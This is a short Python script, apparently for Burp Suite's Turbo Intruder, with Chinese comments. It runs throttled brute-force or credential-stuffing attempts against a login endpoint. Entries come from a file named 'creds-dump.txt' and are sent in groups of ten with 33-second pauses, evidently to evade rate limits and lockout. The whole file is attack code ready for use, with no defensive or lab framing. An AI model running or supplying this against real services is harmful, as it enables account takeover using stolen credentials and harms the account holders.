import time
import datetime as dt

"""
间歇暴破
- 任务派发 `engine.queue`，类似协程/线程的并发模型
- 时间控制 time.sleep 
"""

def task_data_generator_builder(file_path):
    """
    将暴破数据构造为生成器，每次调整
    """
    # 设置为生成器，以字符串格式逐行读取并格式化
    with open(file_path) as f:
        for data_block in f:
            # 格式清理
            task_data = data_block.rstrip()
            yield task_data

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           pipeline=False,
                           engine=Engine.BURP
                           )

    # 设置参数
    ## 每组尝试次数
    group_size=10 
    ## sleep 单位为秒，设置时间后使用 dt.timedelta.seconds
    ## 每组尝试间隔
    group_throttle = dt.timedelta(minutes=0, seconds=33)
    ## 组内每个请求间隔
    task_throttle=dt.timedelta(microseconds=5)
    ## 字典路径
    file_path = 'E:/creds-dump.txt'

    # 组内任务计数
    cur_group_count=0
    # 循环遍历字典列表
    for task_data in task_data_generator_builder(file_path):
        # 应用组内尝试间隔
        time.sleep(task_throttle.seconds)
        # 使用请求模板，`%s` 填入当前测试条目
        engine.queue(target.req, task_data)
        cur_group_count += 1
        # 应用每组尝试间隔
        if(cur_group_count == group_size):
            time.sleep(group_throttle.seconds)
            cur_group_count = 0

def handleResponse(req, interesting):
    if interesting:
        table.add(req)
        